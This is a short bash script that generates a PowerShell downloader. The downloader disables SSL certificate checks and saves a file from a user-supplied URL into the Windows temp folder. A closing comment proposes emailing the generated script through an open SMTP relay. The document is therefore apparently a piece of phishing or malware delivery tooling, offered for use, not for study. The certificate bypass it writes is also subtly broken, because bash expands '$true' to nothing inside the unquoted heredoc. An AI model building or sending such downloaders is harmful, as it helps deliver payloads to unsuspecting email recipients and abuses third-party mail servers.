#!/bin/bash

# Prompt for URL of the file
echo "Enter the URL of the file to be downloaded:"
read url

# PowerShell script file name
ps_script_name="download_file.ps1"

# Generate PowerShell script
echo "Generating PowerShell script..."

cat << EOF > $ps_script_name
# PowerShell script to download a file from a web server to the temp directory

# Ignore SSL certificate errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Set the URL
\$url = "$url"

# Get temp directory path
\$tempDir = [System.IO.Path]::GetTempPath()

# Download the file to the temp directory
Invoke-WebRequest -Uri \$url -OutFile (\$tempDir + "\\downloaded_file.txt")
EOF

echo "PowerShell script '$ps_script_name' has been generated."

# Next step would be to send the PowerShell script via email using your open SMTP relay
# You could use something like the 'mail' command in Unix, or another method depending on your setup
